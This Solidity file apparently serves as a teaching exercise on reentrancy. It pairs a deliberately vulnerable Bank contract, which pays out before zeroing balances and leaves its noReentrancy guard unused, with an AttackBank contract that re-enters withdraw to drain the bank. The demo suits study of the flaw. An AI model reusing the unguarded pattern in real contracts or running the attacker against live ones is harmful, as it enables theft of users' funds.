// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

contract Bank {
  mapping (address => uint256) public deposits;
  uint private locked;

  // 记录账户的余额
  function deposit() public payable {
    deposits[msg.sender] += msg.value;
  }
  // 取钱
  function withdraw () public {
    (bool success, ) = msg.sender.call{value: deposits[msg.sender]}('');
    
    require(success, 'transfer faild');

    deposits[msg.sender] = 0;
  }

  function getBalance() public view returns(uint) {
    return address(this).balance;
  }

  modifier noReentrancy() {
    require(locked == 0, 'No reentrancy');
    locked = 1;
    _;
    locked = 0;
  }

}


contract AttackBank {
  Bank public bank;

  constructor(address _a) {
    bank = Bank(_a);
  }

  receive() external payable {
    if(address(bank).balance >= 1 ether) {
      bank.withdraw();
    } 
  }

  function attack () external payable {
    require(msg.value >= 1 ether);
    bank.deposit{value: 1 ether}();
    bank.withdraw();
  }

  function getBalance() public view returns(uint) {
    return address(this).balance;
  }
}

